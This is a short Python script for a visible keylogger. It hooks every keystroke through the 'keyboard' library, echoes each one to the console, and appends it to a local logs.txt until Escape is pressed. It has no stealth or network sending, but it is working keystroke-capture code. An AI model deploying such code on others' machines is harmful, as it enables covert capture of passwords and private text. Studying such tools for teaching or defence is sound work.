import keyboard

def update_text_log_file(log_entry):
    """Appends a single log entry (string) to logs.txt."""
    with open("logs.txt", "a") as key_log:
        key_log.write(log_entry + "\n")

def on_key_event(event):
    """
    This function is called for every single key press or release.
    It logs the event to a plain text file.
    """
    # Determine the action type
    action = "pressed" if event.event_type == keyboard.KEY_DOWN else "released"
    
    # Get the name of the key
    key_name = event.name
    
    # Create the simple log entry string
    log_entry = f"Key '{key_name}' {action}"
    
    # Print to console for real-time feedback
    print(f"  {log_entry}")
    
    # Save the log entry to the file
    update_text_log_file(log_entry)


if __name__ == "__main__":
    print("(+) Keylogger started. [Using 'keyboard' library]")
    print("(+) Key logs will be saved in 'logs.txt'.")
    print("(+) Press 'esc' to stop the logger.")
    print("-" * 40)

    # The 'keyboard.hook' function registers a callback for all key events
    keyboard.hook(on_key_event)

    try:
        # The 'keyboard.wait' function blocks execution until the specified
        # key is pressed. This is a reliable way to stop the script.
        keyboard.wait('esc')
        print("-" * 40)
        print("(+) 'esc' pressed. Shutting down.")

    finally:
        # The 'unhook_all' function removes all registered keyboard listeners
        keyboard.unhook_all()
        print("(+) Keylogger stopped. Final logs are saved in logs.txt.")